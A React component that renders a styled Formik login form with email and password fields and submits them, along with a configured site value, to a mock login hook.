import { Field, Form, Formik } from "formik";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config";

function LoginForm({ setShowModal }) {
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin({ setShowModal });

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="px-5 pb-5 py-4 w-[400px] bg-[#212529] shadow-lg rounded-lg">
      <h3 className="flex justify-center text-[25px] font-bold text-white lg:text-left">
        Log in to your account
      </h3>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-3 rounded bg-[#EDEDED] border-b-2 border-yellow-500 outline-none shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />
              <Field
                className="mt-5 w-full text-lg  px-[8px] py-3 rounded bg-[#EDEDED] border-b-2 border-yellow-500 outline-none shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                type="submit"
                className="mt-[53px]  w-full  border-2 border-[#EFBE00] text-[#EFBE00] bg-transparent  py-1.5 rounded"
              >
                LOG INTO MY ACCOUNT
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
